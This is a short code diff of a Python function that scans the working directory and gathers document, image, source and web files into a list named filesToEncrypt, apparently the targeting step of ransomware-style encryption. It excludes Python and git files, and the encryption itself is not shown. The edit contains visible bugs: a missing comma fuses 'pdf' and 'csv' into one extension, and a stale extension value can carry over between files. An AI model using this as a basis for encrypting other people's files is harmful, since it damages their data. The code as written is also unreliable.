@@ -4,18 +4,19 @@ import os
 
 
 def getFiles():
-
-    supportedExtensions = ("txt", "java", "c",
+    supportedExtensions = ("txt", "java", "c", "png", "pdf"
                            "csv", "cgi", "pl", "html", "js", "php")
     directoryFiles = os.listdir()
-    exceptions = ["py", "git", ]
+    exceptions = ["py", "gitignore", "git", "md"]
     filesToEncrypt = []
     for file in directoryFiles:
         try:
-            fileExtension = (str(file.rsplit(".")[1]))
+            if str(file).count(".") > 0:
+                fileExtension = (str(file.rsplit(".")[1]))
         except:
             fileExtension = ""
-        if (supportedExtensions.count(fileExtension) > 0) & (fileExtension != ".py"):
-            filesToEncrypt.append(file)
+        if fileExtension != "":
+            if (supportedExtensions.count(fileExtension) > 0) & (exceptions.count(fileExtension) < 1):
+                filesToEncrypt.append(file)
 
-    return directoryFiles
+    return filesToEncrypt
